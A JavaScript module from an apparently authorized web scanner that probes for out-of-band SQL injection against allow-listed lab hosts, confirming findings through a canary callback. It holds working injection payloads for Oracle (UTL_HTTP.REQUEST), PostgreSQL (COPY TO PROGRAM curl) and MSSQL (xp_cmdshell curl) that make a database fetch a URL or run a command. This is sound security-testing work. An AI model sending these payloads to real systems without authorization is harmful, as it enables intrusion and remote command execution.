// Dark Matter rule-based scanner — SQL injection out-of-band (OOB) probe.
// Row #280 [High], CWE-89. The blind-SQLi family taken out-of-band: a
// SQL injection point whose payload makes the DATABASE itself issue an
// HTTP request to a canary URL the scanner controls. The collaborator
// hit IS the proof — no hit, no finding (100% truth rule).
//
// The probe reuses the in-process OOB collaborator (oobCollaborator.js):
// runScan starts one collaborator for this phase (same pattern as the
// XXE OOB and SAML-XXE OOB steps) and passes its base URL + waiter
// through opts (oobCallback / oobWaitFor). The probe itself sends the
// payloads and waits per token; it never starts a listener.
//
// LAB-GATED (safety requirement): OOB payloads go out ONLY when the
// target host is listed in opts.labTargets. A non-lab target never
// receives a callback URL. The probe also requires the waiter to be
// wired — without oobWaitFor there is nothing to confirm a hit with,
// so it returns [] without a single request.
//
// Payloads (one canary token per payload, cap 2 payloads per param,
// cap 2 params per scan — the waitFor budget is 8s per token, so the
// phase budget is ~32s max). One confirmed finding per param: the
// second variant is a fallback for a different SQL context, not a
// second finding.
//   - Oracle: UTL_HTTP.REQUEST (string context + numeric context).
//   - PostgreSQL: COPY TO PROGRAM curl (needs superuser; labs almost
//     never allow it — the payload is still the honest probe, the hit
//     is the proof).
//   - MSSQL: xp_cmdshell curl (needs xp_cmdshell enabled — same honest
//     probe logic).
//   - MySQL / SQLite: NO HTTP-fetch function exists — no payload.
//     Do NOT fake one (a LOAD_FILE('http://...') payload would never
//     fetch HTTP and would be a false probe).
// DNS exfiltration (xp_dirtree UNC, DBMS_LDAP) is NOT covered — the
// collaborator speaks HTTP only. That stays GAP.
import { mutateUrl, probePointName, probePointParameter } from '../probePoints.js';

import { isLabTargetHost } from '../../labCreds.js';
const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const MAX_PARAMS = 2;
const MAX_PAYLOADS_PER_PARAM = 2;
const WAIT_MS = 8000;

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

// LAB GATE: the OOB variant runs only when the authorized host is listed
// in opts.labTargets (canonical isLabTargetHost, labCreds.js).

// Normalize the fingerprint dbHint to the dialect the OOB payloads are
// built for. detectDbFamily returns 'postgres' (not 'pgsql'); accept
// the common aliases too. Anything else (mysql, sqlite, null, unknown)
// maps to itself and yields no payloads — see oobPayloadBuilders.
export function normalizeDbHint(raw) {
  const h = String(raw || '').toLowerCase();
  if (h === 'pgsql' || h === 'postgres' || h === 'postgresql') return 'postgres';
  if (h === 'mssql' || h === 'sqlserver' || h === 'sql-server') return 'mssql';
  if (h === 'oracle') return 'oracle';
  return h || null;
}

// Payload builders for one DB dialect: an array of { dialect, build }
// where build(canaryUrl) returns the payload string for that canary.
// Oracle gets two variants (string context + numeric context); Postgres
// and MSSQL one each. MySQL / SQLite / unknown → [] (no HTTP-fetch
// function exists — no payload is ever built for them).
export function oobPayloadBuilders(dbHint) {
  const dialect = normalizeDbHint(dbHint);
  if (dialect === 'oracle') {
    return [
      { dialect, build: (c) => `'||UTL_HTTP.REQUEST('${c}')||'` },
      { dialect, build: (c) => `1||UTL_HTTP.REQUEST('${c}')` },
    ];
  }
  if (dialect === 'postgres') {
    return [{ dialect, build: (c) => `';COPY(SELECT 1) TO PROGRAM 'curl ${c}'--` }];
  }
  if (dialect === 'mssql') {
    return [{ dialect, build: (c) => `';EXEC xp_cmdshell 'curl ${c}'--` }];
  }
  return [];
}

// Fire one GET and report whether the transport reached the target.
// The response body is irrelevant — the finding fires only on the
// collaborator hit, never on response content. A transport failure
// yields ok:false so the caller can skip the wait (waiting up to 8s
// for a hit that cannot come would only stall the scan — same
// precondition as the XXE OOB variant).
async function fire(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
    });
    await res.text().catch(() => '');
    return { ok: true, status: res.status };
  } catch {
    return { ok: false, status: 0 };
  } finally {
    clearTimeout(t);
  }
}

export async function probeSqliOob(params, url, opts = {}) {
  const findings = [];
  // Lab gate + waiter gate, checked BEFORE any request: without a
  // callback base, without a waiter, or on a non-lab host, the probe
  // returns [] and sends nothing. A non-lab target never receives a
  // callback URL, and a payload without a waiter could never be
  // confirmed — sending it would be pure noise.
  if (!opts.oobCallback || typeof opts.oobWaitFor !== 'function' || !isLabTargetHost(url, opts.labTargets)) {
    return findings;
  }
  const base = String(opts.oobCallback).replace(/\/+$/, '');
  const builders = oobPayloadBuilders(opts.dbHint).slice(0, MAX_PAYLOADS_PER_PARAM);
  if (builders.length === 0) return findings;
  for (const param of params.slice(0, MAX_PARAMS)) {
    for (const [variantIdx, { dialect, build }] of builders.entries()) {
      // One fresh token per payload: a hit proves THIS payload fired,
      // and a per-run random token can never be mistaken for another
      // probe's confirmation (same discipline as xxe_oob / saml_xxe_oob).
      const token = `sqli-oob-${rand()}`;
      const canary = `${base}/${token}`;
      const payload = build(canary);
      const target = mutateUrl(url, param, payload);
      const sent = await fire(target, opts);
      if (!sent.ok) continue;
      const hit = await opts.oobWaitFor(token, opts.oobWaitTimeoutMs || WAIT_MS);
      if (!hit) continue;
      findings.push({
        class: 'sqli_oob',
        id: `sqli-oob-${probePointName(param)}-${dialect}-${variantIdx}`,
        title: `SQL injection (out-of-band) in parameter '${probePointParameter(param)}' — the database fetched the collaborator URL`,
        severity: 'high',
        url,
        param: probePointParameter(param),
        evidence: {
          request: `GET ${target}`,
          response: `payload sent (status ${sent.status}); collaborator received ${hit.method} ${hit.path} at ${hit.at} — the database issued an HTTP request to the canary URL`,
          impact_demo: `Out-of-band SQLi (${dialect}): the database makes attacker-controlled network requests — gateway to data exfiltration via HTTP`,
          signalCorrelated: true,
          oobHit: true,
        },
        dbFamily: dialect,
      });
      // One confirmed finding per param — the second variant is a
      // fallback for a different SQL context, not a second finding.
      break;
    }
  }
  return findings;
}
